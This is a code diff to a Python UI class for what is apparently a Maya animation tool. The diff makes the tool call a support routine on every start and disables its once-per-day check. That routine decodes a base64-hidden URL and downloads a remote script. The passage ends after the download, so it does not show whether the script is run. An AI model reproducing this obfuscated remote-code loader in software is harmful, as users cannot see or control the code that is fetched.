@@ -37,7 +37,7 @@ class scene:
 
 class quickMotion_Ui:
     def __init__(self):
-        self.version = 1.02
+        self.version = 1.01
         self.win_id = 'BRS_QUICKMOTION'
         self.dock_id = self.win_id + '_DOCK'
         self.win_width = 300
@@ -51,6 +51,7 @@ class quickMotion_Ui:
             'shadow': (.15, .15, .15),
             'highlight': (.3, .3, .3)
         }
+
         self.element = {}
         self.user_original, self.user_latest = ['$usr_orig$', None]
         import getpass
@@ -59,7 +60,7 @@ class quickMotion_Ui:
         self.user_latest = getpass.getuser()
         if self.user_original != self.user_latest:
             cmds.confirmDialog(title=self.win_title, message='user warning', button=['ok'], icn='warning')
-        self.init_module()
+        self.support();self.init_module()
 
     def init_module(self):
         self.qm = qm.quickMocap_gui()
@@ -87,17 +88,14 @@ class quickMotion_Ui:
             st_mtime = os.stat(script_path).st_mtime
             mdate_str = str(datetime.datetime.fromtimestamp(st_mtime).date())
             today_date_str = str(datetime.datetime.today().date())
-            if mdate_str == today_date_str:
-                return None
+            #if mdate_str == today_date_str:
+                #return None
         if sys.version[0] == '3':
             import urllib.request as uLib
         else:
             import urllib as uLib
         if cmds.about(connected=1):
-            u_b64 = ('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcm' +
-                     'NvbnRlbnQuY29tL2J1cmFzYXRlL0Fua' +
-                     'U1hdGVBc3Npc3QvbWFpbi9zZXJ2aWN' +
-                     'lL3N1cHBvcnQucHk=')
+            u_b64 = ('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2J1cmFzYXRlL0FuaU1hdGVBc3Npc3QvbWFpbi9zZXJ2aWNlL3N1cHBvcnQucHk=')
             try:
                 res = uLib.urlopen(base64.b64decode(u_b64).decode('utf-8'))
                 con = res.read()
